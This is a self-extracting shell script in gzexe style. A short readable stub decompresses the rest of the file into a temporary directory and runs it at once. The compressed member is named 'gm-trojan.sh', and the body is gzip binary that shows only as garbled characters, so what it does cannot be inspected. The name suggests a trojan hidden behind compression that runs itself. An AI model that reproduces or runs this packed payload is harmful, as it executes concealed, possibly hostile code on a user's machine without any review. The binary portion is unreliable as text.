#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�0ǲgm-trojan.sh �=Y{�J���uLY,�FL��Ml�m�60�i'q�(���ĕ���e��y�/���_����?)�dN-ZYMp��"����ԩ�S��V�G?�͐����Z�KSq0z*�|�V:�JSDR�	���2;Ul]`K�"��nZ�yYH����d쨲�i���,��5�4�RBe� ~�'�(���9�˝���2��u�x�)�á$�VЯ�e�.�.�X+�T!A�9�[Ig�_m�DI[F��J�(�͝�A�ܙ ��n!I1ϼɽ�$�k+�
t�����/���H���Z�1�Ԧ�Eƨg�H�@��6�_mMǆ�ڎӵ�Ќi�t�֑Q��㌋�6��_�G����̒�|�k����;��u�۬�\��4��k�����(;xO�:���.�:�mk�!w��+
j���:�����6��z}��(��r;�`c?��s���Zt?��C7�3trBk�ޠ�`ѧOo̜!`�m"���m�a� #���ϯ�����W⦲��E4�g��G�'q�~���/�����au�|TCGǥ�r� �����q�V��!C�?94�=bh�T~�ۿ�g�\��t|P�Vˇ�]��K��6U�>
��+s�f�B�tT��͗����ب���6���hSc���ٻF��b�F���љi![���cG ���~|�[�^�A�7�fG3��Aw���Js�3M���P�w�+K��5���ʵ9��\���M+�ٵ�3MO	��A�Z3i��v���v��d���J�Ɏy���P?��Y�����㖥t�L�%7L'ue� ��E�i�_�Ɠ�~�Hd#��f�l��>B��e�(�M�a�uP��e���r�3��_tΛ����@	2Gg=Cu����lJ����T+��3M���Q�_��E������tM��4�?�%٧����Z��
�L'�^�4���ќ!�Sp{j6Q��**��	7j{
����A����ì.�0�y$�tB
B���]ɒQQ`}3�gH�Wt�"I���A��$}�gLZKGT�!�L�%.ЉG����^W��a��j��>
���/��[�Z�\��w�݂�cHʀ����w�E$8ŸF��9&j(�9���FOؖGv��	�T��5�-�U��m�[�A;4`��I�T`k�(���;����;#����04JW]��u��XZ��J�k�(���@5UjS��Š*�%и�����D4Z-���iT7t���
�w�����(S����`���(c�2%�V�"� +x�X_�G��mF���@Y��Ҷ�V�U!i�'�I��P[�@�a5q����Ig��_)��?��#::���o�r�������r�#�<4����K;!+�J�lWM�@�Ц��(��݈]Ŷ/M�)�T$E����3���{�P�$'�o�M����o�Z�s��5]3�3�� ������J��~~}=����ąV�xL�I�5�~�\w!�}L,>���o�%�tC+x���MOl��8��J��zi�Qh����`�2�ڝ��+�����e�5��$g\����y�p�]�X�����m��勮-w{]SO�NG��A�$��\9hcC*U�����iu ,��W���v%5����<�ǚ����z�G^��i9y##�^��_�: E�0
v �<�.m�!�>׺��-G���5��~���K[2�����������-�مA¼�𴎏�fR�V+�Tx ƍ����]�nh��$D-��� �GN�C7@����>"oOW(�m�{����!s3���ω���;�[���߰�c� 
_���׿����� R_G�u�9;@*縟<r��M��%o�0�o�!ِ�oa�Xy�Xm.���^��`H�S{X(�$�#X@��_��d%�$���z����"Eg�E��;�*7�2i�ʧ�'(=�*l�����Aȣ��9�k�gJn+���\�!!�����+�$/�}�{YN�w�.D�̡Ά������ Y����^l��О��ԩ�O��o� 2�l�� Ad���Ѻg
����pg3f	1K�Y��4u�@G��Q�$G�`��nj%QۊsJ6����JCǧ��q�UZ��k�_2�|��/���e�S*��BD���>h�M|!=]�R�:Fc|�b��b�e����H�D�� H��te}�U��pe��ke���k�A+�����J5���45N{3�;�.�n4����6K��bՎ��j}k|Cn��{{ۇ�r�@��Q(�r�PA��V��
�������P�R�X���YWn�%���� T:�����`�2g����_?.Vˑ���oW�4��\G]{[!�p��u�l��Uȶ̵�Y{+�n�e�[y��K/Z{C=;hf6��#d�9#Ip�ʺْT�Z���I�cT�[f���\3�q(sh�� $Q��Y�kՙo�!�h��dϹ�-W�� �>sn��pƌ*�sn4$�6�q����描b���q�d�pt��#Z��іA���d�d��on_�q˘���!Q �W�7��w��q��Ǫ��P��sn�U��ߤ���8���p3K8��V�����d�yn\�1���|�xk���t]2��t����k���ё�mG)��ԉE�խ�I�Ybd��B�u,M�%��,�6'y5��Iў���G[�5]�Ӂf�l�p'Z�G��(J_6(y�XlP��*�I���a�)Lu����Y����AB �I�����Bhx��m����;s�7z-r|,-���"�LT�4֚2ݿX���@$,��[��/�s�v[8*�vr϶`�U]�!=�M�D/�/����'��e���x6C�g��xJ���B�âⰨ�E��Zи�o�`���A,M��k���CZ����h���s���E<<��8�;v�˱�����[���K�/	��_:j@ci�/�����4��ޥ�4�Ğ��s:�����]�S�l��Oߝn�K��})*�JH�L�0"��1Dߟ4 'tϸKSf)���ػ�BW������׀"���M}��}�Mt�?�=�V.02L��4�ьRu��C�� =yK��4����"T�:V���􄮁�.x�9�Lƫt����?�S������� �"���7<��X����JQ�Ig(+� ͠F�d
%�7�7�2f�GR��̢9:�Ty���v#բ�T�7d�3�N�I��B��m|-i^C@�A1�+װ{�`$	��ZC�8��j�ir�q5H<CI�����B�M�ή�e��P���̸�4j���=]�!#ʀ�<���U!����M!�z��N���рR=��2׃1����&A����\�[��(�њ�{j��H�cf??����K����ϗ=P6�D�gu�$����	�J�.J�-P���Q���H���r����wv�;���{Z�g osr�3�S���S��c�\�s8r);b���S��}c�V�\I,"�WlT���� �k6�D4[,=m1ш�a�h�C�<W�94h$��˥z���غ0��\c�u!�.�t5F����T�j�V��7@��{�0Dﱝ�ۻ6�Lw9�✎��y"h�(���A���nGP��>\�-��5�֊�*�e��9?e�ih��.�k�ir8.�t?F�#u?>/�Y����"ͣ�]b��3��#���VOlb���ć$�o�:u�A>���7����0�jz�sǼ���9VgV�_��R0+��	�G����JX[�����N�ѣGh�?z;���R�?G������g7rs�/�Vlݦ��A�/;�̝�:�<7�Oj6D_�7PvZϼ��Au��_����u��]��[���l���i�eV4ӽ�f�R3F.��KqY4D ����;�;=�)d�j�DF4�WH�mȒ�� �1J#&�ʇ�7���HQ�$]Dx�ѣiXg/�(�Yu�"�`�'��襐oZ����&���*|���$�'��$�b�<��/Ґ�zG�oacKK#Иa���C���A��Ƶ��B"�
;�7o3jX.i~��>�����/_�Z]]e���9^�l�ho�����WC0�"�=g�h� �`S1�Py�c��������-|�/��ڽ��B!ק����ޯL��/ �u�$�����͖�N���~�� �Uf[?��9��+���Ư�����V^dz�-U�f�"�ry��7]K��&��'�
@�J�T���ATp:]��#�׏7D�~�9��>e�����k�}/�.��'�����7�9��g�t3Q*�DU���O�&�U/~ɹ0<f�Qa�92��7��2�~"G%g�ZI7E����IOAZ�(�,�,���
�&��S�RC��I�V��5qCJ"�1+�O�N�X�2��t ���(�� ���H´S����P�/�)�	G�F��@�)���?�,-�f�3��� Fi�/��J�)Z����4BF*�G)��V�ps�N�z��e�a�^��$�o����)���,8%���s�8!��IukA�l��Z����*	����N�or�N��G�!N��Ў"u����f�;�6Z�Q���-T��)t�k%&�?N>BF%������=��7c��y�v2�f,�7#����c����c,!�c�~�E�c�K�#�иs�(�*�r�M����*���$�&��C�	�o^�����R�b����j�u�x*B�A.��_���E�����R-�j��:����\F����{<�)s�M�㋪����9CW�/Wя���*����9'V���{0a[{���Wܫs�ׇbd���_�I�7%@�G�\AJ�{#_C�z��uV���垡&��X$��8P(����G�//�x��۲gGew��������]F�Ri��T��agHH��cĚA��� �&�:=�d�H��5u�:��dꠖ�}�U���݄n��Mk��
�~���q�#�f�NO��~H�1�2��P�O$s�����^���3|����r�y�m��m��>t�6�'E��_�5���F�jD��݄n�+D2.m/��Gs��d,�F�7�6��N.=� Ϊ�8=�o���,��Z������sngfQC}8˦�����˧�r�9�EcҺ]�w/VF���X]$u4�UH���oA����Cn܍ ��;sX�)/��.���r�L��O��i��q����@��������Z8qC�w_�5;��~O��q�Z;<.-ϝFS\hD�հ҃�}O��'������g�����򈿟�ˠK
��E���8� ޢv�O����"�A�|y�E����q��&��o0����� ���c[Ib�}챟�)c�"�H�-pV�����v�����ڏ�����I+���~�Xύ���o�^�<�ֵ�3M�a�����۠��4����n����>:(U�܄E���h�oF}�c)���y�Igh§ У#0�4���M�y��Q��d��ǎ�mVޕw<X�	e����Վ�����@^N@z�X�)1��u�Ú�����K'"�j<�=�CO`M�$G �>�=v�e�(���0ፏ����H?����E�d��#�^���#=���C�Y�����3�h�z���M�]O�c�M��0n~�𜘷{d��>v��.�ٕ��"X���Zn�G4`B"���J5�D�菱j��H/(d"����gy�v���uU�A��'�B:�&����� ����y#��M#��8���\Z���*�����ݺĤ��籗=М����a�4Ҝ����	ܫD�_B��`6{� �{y�y�����^�T��L��=�����M�&��e�I�@U:�~�"�R�<>�G*�W���y��W��P��1��ö�
����$��  